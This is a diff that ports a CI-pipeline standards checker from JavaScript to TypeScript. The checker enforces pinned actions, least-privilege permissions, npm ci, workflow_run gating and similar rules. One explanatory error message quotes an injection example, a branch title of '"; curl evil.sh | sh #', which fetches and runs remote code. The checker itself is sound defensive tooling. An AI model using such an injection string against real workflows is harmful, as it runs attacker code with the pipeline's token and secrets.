@@ -52,45 +52,76 @@
  *  13. THE CI NODE VERSION SATISFIES engines.node. Nothing reads `engines` during
  *      a workflow, so the two drift silently: CI proves the app works on the
  *      major IT installs, while `engines` tells contributors and `npm ci` a
- *      different one is enough. Whichever is lower is the one nobody tests.               → check-refactoring.mjs
+ *      different one is enough. Whichever is lower is the one nobody tests.               → check-refactoring.ts
  */
 import fs from 'node:fs';
 import path from 'node:path';
 import YAML from 'yaml';
-import { REPO_ROOT as ROOT } from '../lib/repo-root.mjs';
+import { REPO_ROOT as ROOT } from '../lib/repo-root.ts';
 
 const WORKFLOW_DIR = '.github/workflows';
 const ACTIONS_DIR = '.github/actions';
 const CHECKS_DIR = 'scripts/check';
 const CI_WORKFLOW = `${WORKFLOW_DIR}/ci.yml`;
 
-const failures = [];
-const fail = (file, what, why) => failures.push({ file, what, why });
-const read = (rel) => fs.readFileSync(path.join(ROOT, rel), 'utf8');
+type Failure = { file: string; what: string; why: string };
+
+const failures: Failure[] = [];
+const fail = (file: string, what: string, why: string): void => {
+    failures.push({ file, what, why });
+};
+const read = (rel: string): string => fs.readFileSync(path.join(ROOT, rel), 'utf8');
 
 const workflowFiles = fs
     .readdirSync(path.join(ROOT, WORKFLOW_DIR))
     .filter((f) => f.endsWith('.yml') || f.endsWith('.yaml'))
     .sort();
 
-if (!workflowFiles.length) {
+if (workflowFiles.length === 0) {
     fail(WORKFLOW_DIR, 'no workflow files found', 'Every section below would pass vacuously. Did the directory move?');
 }
 
-const workflows = [];
-const parked = [];
+/** A parsed workflow or action.yml, reduced to the keys this gate reads. YAML is untyped, so leaves stay `unknown`. */
+type Step = { uses?: unknown; run?: unknown; with?: { cache?: unknown; ref?: unknown } };
+type Job = {
+    'steps'?: unknown;
+    'if'?: unknown;
+    'needs'?: unknown;
+    'permissions'?: unknown;
+    'strategy'?: { matrix?: Record<string, unknown> & { include?: unknown } };
+    'runs-on'?: unknown;
+    'timeout-minutes'?: unknown;
+};
+type WorkflowDoc = {
+    on?: Record<string, unknown>;
+    /** YAML 1.1 reads a bare `on:` key as the boolean `true`. */
+    true?: Record<string, unknown>;
+    jobs?: Record<string, Job>;
+    runs?: Job;
+    /** `null` when the key is present but empty (`concurrency:` on its own line). */
+    concurrency?: unknown;
+    permissions?: unknown;
+};
+type Parsed = { rel: string; src: string; doc: WorkflowDoc };
+
+const workflows: Parsed[] = [];
+const parked: string[] = [];
 
 for (const f of workflowFiles) {
     const rel = `${WORKFLOW_DIR}/${f}`;
     const src = read(rel);
-    let doc;
+    let doc: unknown;
     try {
         doc = YAML.parse(src);
     } catch (err) {
-        fail(rel, `is not valid YAML (${err.message.split('\n')[0]})`, 'This gate cannot inspect it, so every rule below is silently blind to this file. Fix the syntax.');
+        fail(
+            rel,
+            `is not valid YAML (${(err as Error).message.split('\n')[0] ?? ''})`,
+            'This gate cannot inspect it, so every rule below is silently blind to this file. Fix the syntax.',
+        );
         continue;
     }
-    if (doc && typeof doc === 'object') workflows.push({ rel, src, doc });
+    if (doc !== null && typeof doc === 'object') workflows.push({ rel, src, doc });
     else parked.push(rel);
 }
 
@@ -103,29 +134,37 @@ const actionFiles = fs.existsSync(path.join(ROOT, ACTIONS_DIR))
           .sort()
     : [];
 
-const actions = [];
+const actions: Parsed[] = [];
 
 for (const rel of actionFiles) {
     const src = read(rel);
     try {
-        const doc = YAML.parse(src);
-        if (doc && typeof doc === 'object') actions.push({ rel, src, doc });
+        const doc: unknown = YAML.parse(src);
+        if (doc !== null && typeof doc === 'object') actions.push({ rel, src, doc });
     } catch (err) {
-        fail(rel, `is not valid YAML (${err.message.split('\n')[0]})`, 'Every workflow that calls this action fails at the `uses:` step, before running anything. Fix the syntax.');
+        fail(
+            rel,
+            `is not valid YAML (${(err as Error).message.split('\n')[0] ?? ''})`,
+            'Every workflow that calls this action fails at the `uses:` step, before running anything. Fix the syntax.',
+        );
     }
 }
 
-const triggersOf = (doc) => doc.on ?? doc.true ?? {};
-const jobsOf = (doc) => Object.entries(doc.jobs ?? {});
-const stepsOf = (job) => (Array.isArray(job.steps) ? job.steps : []);
+const triggersOf = (doc: WorkflowDoc): Record<string, unknown> => doc.on ?? doc.true ?? {};
+const jobsOf = (doc: WorkflowDoc): [string, Job][] => Object.entries(doc.jobs ?? {});
+const stepsOf = (job: Job): Step[] => (Array.isArray(job.steps) ? (job.steps as Step[]) : []);
 
-const stepSources = [
+const stepSources: { rel: string; src: string; jobs: [string, Job][] }[] = [
     ...workflows.map(({ rel, src, doc }) => ({ rel, src, jobs: jobsOf(doc) })),
-    ...actions.map(({ rel, src, doc }) => ({ rel, src, jobs: [[path.basename(path.dirname(rel)), doc.runs ?? {}]] })),
+    ...actions.map(({ rel, src, doc }) => ({
+        rel,
+        src,
+        jobs: [[path.basename(path.dirname(rel)), doc.runs ?? {}]] satisfies [string, Job][],
+    })),
 ];
 
-const lineOf = (src, needle) => src.slice(0, src.indexOf(needle)).split('\n').length;
-const isWorkflowRun = (doc) => Boolean(triggersOf(doc).workflow_run);
+const lineOf = (src: string, needle: string): number => src.slice(0, src.indexOf(needle)).split('\n').length;
+const isWorkflowRun = (doc: WorkflowDoc): boolean => Boolean(triggersOf(doc)['workflow_run']);
 
 // ── 1. timeout-minutes on every job ─────────────────────────────────────────
 for (const { rel, doc } of workflows) {
@@ -151,7 +190,11 @@ for (const { rel, doc } of workflows) {
         );
         continue;
     }
-    if (typeof group !== 'object' || group['cancel-in-progress'] === undefined) {
+    if (
+        group === null ||
+        typeof group !== 'object' ||
+        (group as Record<string, unknown>)['cancel-in-progress'] === undefined
+    ) {
         fail(
             rel,
             '`concurrency` does not set `cancel-in-progress`',
@@ -171,11 +214,19 @@ for (const { rel, doc } of workflows) {
         continue;
     }
     if (doc.permissions === 'write-all') {
-        fail(rel, '`permissions: write-all`', 'That is every scope at once — the opposite of the rule. Enumerate the scopes actually used.');
+        fail(
+            rel,
+            '`permissions: write-all`',
+            'That is every scope at once — the opposite of the rule. Enumerate the scopes actually used.',
+        );
     }
     for (const [name, job] of jobsOf(doc)) {
         if (job.permissions === 'write-all') {
-            fail(rel, `job \`${name}\` sets \`permissions: write-all\``, 'Enumerate the scopes this job actually uses.');
+            fail(
+                rel,
+                `job \`${name}\` sets \`permissions: write-all\``,
+                'Enumerate the scopes this job actually uses.',
+            );
         }
     }
 }
@@ -185,18 +236,18 @@ const USES_LINE = /^[^\S\n]*(?:-[^\S\n]+)?uses:[^\S\n]*(\S+)[^\S\n]*(#.*)?$/gm;
 
 for (const { rel, src } of [...workflows, ...actions]) {
     for (const m of src.matchAll(USES_LINE)) {
-        const [, ref, comment] = m;
+        const [, ref = '', comment] = m;
         if (ref.startsWith('./') || ref.startsWith('docker://')) continue;
         const line = src.slice(0, m.index).split('\n').length;
         const at = ref.lastIndexOf('@');
-        const version = at === -1 ? null : ref.slice(at + 1);
-        if (!version || !/^[0-9a-f]{40}$/.test(version)) {
+        const version = at === -1 ? '' : ref.slice(at + 1);
+        if (!/^[0-9a-f]{40}$/.test(version)) {
             fail(
                 rel,
-                `line ${line}: \`${ref}\` is pinned to ${version ? `the tag \`${version}\`` : 'nothing'}`,
+                `line ${line}: \`${ref}\` is pinned to ${version !== '' ? `the tag \`${version}\`` : 'nothing'}`,
                 'A tag is a movable pointer. Whoever controls that repository can repoint it at a commit that exfiltrates every secret this workflow can see, and your file does not change by one character. Pin the 40-character commit SHA.',
             );
-        } else if (!comment) {
+        } else if (comment === undefined) {
             fail(
                 rel,
                 `line ${line}: \`${ref}\` is SHA-pinned but has no version comment`,
@@ -214,9 +265,9 @@ for (const { rel, src } of [...workflows, ...actions]) {
  * onnxruntime — where the image change is not a broken label but a different
  * compiler and a different glibc linked into a shipped installer.
  */
-const runnersOf = (job) => {
+const runnersOf = (job: Job): string[] => {
     const declared = job['runs-on'];
-    const values = [];
+    const values: string[] = [];
 
     if (typeof declared === 'string' && !declared.includes('${{')) return [declared];
 
@@ -226,9 +277,11 @@ const runnersOf = (job) => {
     const key = declared.match(/matrix\.([\w-]+)/)?.[1];
     if (key === undefined) return values;
 
-    if (Array.isArray(matrix[key])) values.push(...matrix[key].filter((v) => typeof v === 'string'));
-    for (const entry of Array.isArray(matrix.include) ? matrix.include : []) {
-        if (typeof entry?.[key] === 'string') values.push(entry[key]);
+    const listed = matrix[key];
+    if (Array.isArray(listed)) values.push(...listed.filter((v): v is string => typeof v === 'string'));
+    for (const entry of Array.isArray(matrix.include) ? (matrix.include as unknown[]) : []) {
+        const value = (entry as Record<string, unknown> | null | undefined)?.[key];
+        if (typeof value === 'string') values.push(value);
     }
     return values;
 };
@@ -264,7 +317,7 @@ for (const { rel, src, jobs } of stepSources) {
             if (/\bnpm\s+(?:i|install|add)\b(?![^\n]*\s-g\b)/.test(step.run)) {
                 fail(
                     rel,
-                    `job \`${name}\` runs \`npm install\` (line ~${lineOf(src, step.run.split('\n')[0])})`,
+                    `job \`${name}\` runs \`npm install\` (line ~${lineOf(src, step.run.split('\n')[0] ?? '')})`,
                     'install resolves the ranges afresh and rewrites package-lock.json to match, so CI validates a dependency tree no developer has. `npm ci` installs the lockfile exactly and fails on drift — which is the entire point of running it here.',
                 );
             }
@@ -304,10 +357,14 @@ for (const { rel, doc } of workflows) {
     if (!isWorkflowRun(doc)) continue;
 
     const jobs = new Map(jobsOf(doc));
-    const needsOf = (job) => (Array.isArray(job?.needs) ? job.needs : typeof job?.needs === 'string' ? [job.needs] : []);
+    const needsOf = (job: Job | undefined): string[] => {
+        const needs = job?.needs;
+        if (Array.isArray(needs)) return needs as string[];
+        return typeof needs === 'string' ? [needs] : [];
+    };
 
     /** Every condition governing this job, its own plus every ancestor's. */
-    const conditionClosure = (name, seen = new Set()) => {
+    const conditionClosure = (name: string, seen = new Set<string>()): string => {
         if (seen.has(name)) return '';
         seen.add(name);
         const job = jobs.get(name);
@@ -354,7 +411,7 @@ for (const { rel, doc } of workflows) {
             if (typeof ref !== 'string' || !ref.includes('workflow_run.head_sha')) {
                 fail(
                     rel,
-                    `job \`${name}\` checks out ${ref ? `\`${ref}\`` : 'the default ref'}`,
+                    `job \`${name}\` checks out ${typeof ref === 'string' && ref !== '' ? `\`${ref}\`` : 'the default ref'}`,
                     'Under workflow_run the default is the branch HEAD at trigger time, not the commit the upstream run validated. They diverge exactly when commits land quickly — so the build that ships is of code CI never saw. Pass `ref: ${{ github.event.workflow_run.head_sha }}`.',
                 );
             }
@@ -390,7 +447,7 @@ for (const { rel, src, jobs } of stepSources) {
                 if (!new RegExp(`\\$\\{\\{[^}]*\\b${field.replace(/\./g, '\\.')}\\b`).test(step.run)) continue;
                 fail(
                     rel,
-                    `job \`${name}\` interpolates \`${field}\` into a \`run:\` script (line ~${lineOf(src, step.run.split('\n')[0])})`,
+                    `job \`${name}\` interpolates \`${field}\` into a \`run:\` script (line ~${lineOf(src, step.run.split('\n')[0] ?? '')})`,
                     `That expression is substituted into the script text before the shell parses it, so a branch or title of \`"; curl evil.sh | sh #\` executes with this workflow's token and secrets. Bind it through \`env:\` instead and reference "$VAR" — inside env it is a value, not source code.`,
                 );
             }
@@ -399,7 +456,7 @@ for (const { rel, src, jobs } of stepSources) {
 }
 
 // ── 11. Every `npm run` a workflow invokes exists ───────────────────────────
-const rootPkg = JSON.parse(read('package.json'));
+const rootPkg = JSON.parse(read('package.json')) as { scripts?: Record<string, string>; engines?: { node?: unknown } };
 const rootScripts = new Set(Object.keys(rootPkg.scripts ?? {}));
 
 // Single manifest — this repo is not a workspace root, so `npm -w` never appears.
@@ -409,7 +466,7 @@ for (const { rel, jobs } of stepSources) {
     for (const [name, job] of jobs) {
         for (const step of stepsOf(job)) {
             if (typeof step.run !== 'string') continue;
-            for (const [, script] of step.run.matchAll(NPM_RUN)) {
+            for (const [, script = ''] of step.run.matchAll(NPM_RUN)) {
                 if (!rootScripts.has(script)) {
                     fail(
                         rel,
@@ -425,37 +482,65 @@ for (const { rel, jobs } of stepSources) {
 // ── 12. Every gate script is wired in, all three levels ─────────────────────
 const gateScripts = fs
     .readdirSync(path.join(ROOT, CHECKS_DIR))
-    .filter((f) => f.startsWith('check-') && f.endsWith('.mjs'))
+    .filter((f) => f.startsWith('check-') && f.endsWith('.ts'))
     .sort()
     .map((f) => `${CHECKS_DIR}/${f}`);
 
-if (!gateScripts.length) {
-    fail(CHECKS_DIR, 'contains no check-*.mjs scripts', 'This section would pass vacuously. Did the directory move?');
+if (gateScripts.length === 0) {
+    fail(CHECKS_DIR, 'contains no check-*.ts scripts', 'This section would pass vacuously. Did the directory move?');
 }
 
 const ciCheck = rootPkg.scripts?.['ci:check'] ?? '';
-if (!ciCheck) {
-    fail('package.json', 'has no `ci:check` script', 'It is the one command that runs every gate locally. Without it each gate has to be remembered individually, which is the same as not having them.');
+if (ciCheck === '') {
+    fail(
+        'package.json',
+        'has no `ci:check` script',
+        'It is the one command that runs every gate locally. Without it each gate has to be remembered individually, which is the same as not having them.',
+    );
 }
 
 const ciWorkflow = workflows.find((w) => w.rel === CI_WORKFLOW);
-if (!ciWorkflow) {
+if (ciWorkflow === undefined) {
     fail(CI_WORKFLOW, 'missing', 'Nothing runs the gates on push, so all of them are advisory.');
 }
-const ciRuns = ciWorkflow ? jobsOf(ciWorkflow.doc).flatMap(([, job]) => stepsOf(job).map((s) => s.run).filter((r) => typeof r === 'string')).join('\n') : '';
+const ciRuns =
+    ciWorkflow !== undefined
+        ? jobsOf(ciWorkflow.doc)
+              .flatMap(([, job]) =>
+                  stepsOf(job)
+                      .map((s) => s.run)
+                      .filter((r): r is string => typeof r === 'string'),
+              )
+              .join('\n')
+        : '';
 
 for (const gate of gateScripts) {
     const entry = Object.entries(rootPkg.scripts ?? {}).find(([, cmd]) => cmd.includes(gate));
-    if (!entry) {
-        fail(gate, 'is not invoked by any package.json script', 'Nothing can run it, so the standard it encodes is enforced by nobody. Add a `<domain>:check` script for it.');
+    if (entry === undefined) {
+        fail(
+            gate,
+            'is not invoked by any package.json script',
+            'Nothing can run it, so the standard it encodes is enforced by nobody. Add a `<domain>:check` script for it.',
+        );
         continue;
     }
     const [scriptName] = entry;
     if (!new RegExp(`\\bnpm run ${scriptName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\b`).test(ciCheck)) {
-        fail('package.json', `\`ci:check\` does not run \`${scriptName}\` (${gate})`, 'The gate exists and is skipped locally. Chain it into ci:check so one command still means "everything".');
+        fail(
+            'package.json',
+            `\`ci:check\` does not run \`${scriptName}\` (${gate})`,
+            'The gate exists and is skipped locally. Chain it into ci:check so one command still means "everything".',
+        );
     }
-    if (ciWorkflow && !new RegExp(`\\bnpm run ${scriptName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\b`).test(ciRuns)) {
-        fail(CI_WORKFLOW, `has no step running \`${scriptName}\` (${gate})`, 'The gate exists and is skipped on push, so a violation reaches main and is only caught by whoever happens to run ci:check locally.');
+    if (
+        ciWorkflow !== undefined &&
+        !new RegExp(`\\bnpm run ${scriptName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\b`).test(ciRuns)
+    ) {
+        fail(
+            CI_WORKFLOW,
+            `has no step running \`${scriptName}\` (${gate})`,
+            'The gate exists and is skipped on push, so a violation reaches main and is only caught by whoever happens to run ci:check locally.',
+        );
     }
 }
 
@@ -463,18 +548,26 @@ for (const gate of gateScripts) {
 const enginesNode = rootPkg.engines?.node;
 
 if (typeof enginesNode !== 'string') {
-    fail('package.json', 'declares no `engines.node`', 'It is the only statement of which Node majors this app supports, and what `npm ci` checks a contributor against.');
+    fail(
+        'package.json',
+        'declares no `engines.node`',
+        'It is the only statement of which Node majors this app supports, and what `npm ci` checks a contributor against.',
+    );
 } else {
     const floor = Number(enginesNode.match(/(\d+)/)?.[1]);
 
     /** Every `node-version:` a workflow or composite action asks setup-node for. */
-    const nodeVersions = new Map();
+    const nodeVersions = new Map<string, number>();
     for (const { rel, src } of [...workflows, ...actions]) {
         for (const m of src.matchAll(/node-version:\s*'?"?(\d+)/g)) nodeVersions.set(rel, Number(m[1]));
     }
 
     if (nodeVersions.size === 0) {
-        fail(ACTIONS_DIR, 'no `node-version:` found in any workflow or action', 'Without one setup-node picks whatever the runner image ships, so the tested major changes when the image does.');
+        fail(
+            ACTIONS_DIR,
+            'no `node-version:` found in any workflow or action',
+            'Without one setup-node picks whatever the runner image ships, so the tested major changes when the image does.',
+        );
     }
 
     for (const [rel, major] of nodeVersions) {
@@ -495,7 +588,7 @@ if (typeof enginesNode !== 'string') {
 }
 
 // ── Report ──────────────────────────────────────────────────────────────────
-if (failures.length) {
+if (failures.length > 0) {
     console.error(`\n✖ ${failures.length} pipeline standard violation(s):\n`);
     for (const { file, what, why } of failures) {
         console.error(`  ${file}: ${what}`);
@@ -508,7 +601,7 @@ if (failures.length) {
 const jobCount = workflows.reduce((n, w) => n + jobsOf(w.doc).length, 0);
 const pinned = [...workflows, ...actions].reduce((n, w) => n + [...w.src.matchAll(USES_LINE)].length, 0);
 console.log(
-    `✓ Pipeline OK — ${workflows.length} workflow(s), ${jobCount} jobs, all timed out and concurrency-grouped with least-privilege permissions, ${pinned} action(s) SHA-pinned across workflows and ${actions.length} composite action(s), runners pinned (matrix included), every workflow_run job gated on success and pinned to head_sha with every checkout job gated on a push event, no untrusted input spliced into a shell, and all ${gateScripts.length} gate scripts wired into ci:check and ci.yml.${parked.length ? ` ${parked.length} parked workflow(s) skipped: ${parked.join(', ')}.` : ''}`,
+    `✓ Pipeline OK — ${workflows.length} workflow(s), ${jobCount} jobs, all timed out and concurrency-grouped with least-privilege permissions, ${pinned} action(s) SHA-pinned across workflows and ${actions.length} composite action(s), runners pinned (matrix included), every workflow_run job gated on success and pinned to head_sha with every checkout job gated on a push event, no untrusted input spliced into a shell, and all ${gateScripts.length} gate scripts wired into ci:check and ci.yml.${parked.length > 0 ? ` ${parked.length} parked workflow(s) skipped: ${parked.join(', ')}.` : ''}`,
 );
 console.log(
     '\nNot machine-checked: whether branch protection actually requires the CI check, or whether the release signing story is what the README claims. Those live in repository settings, not in the tree.',
